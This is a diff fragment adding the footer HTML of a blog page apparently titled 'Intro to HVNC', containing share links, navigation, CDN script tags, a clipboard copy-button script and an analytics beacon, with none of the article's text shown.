+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/02/intro-to-hvnc/&name=Intro to HVNC&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/02/intro-to-hvnc/&t=Intro to HVNC"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    fern
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "e2c0a56b5d4d466baf300058fd41c3e8"}'></script>
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
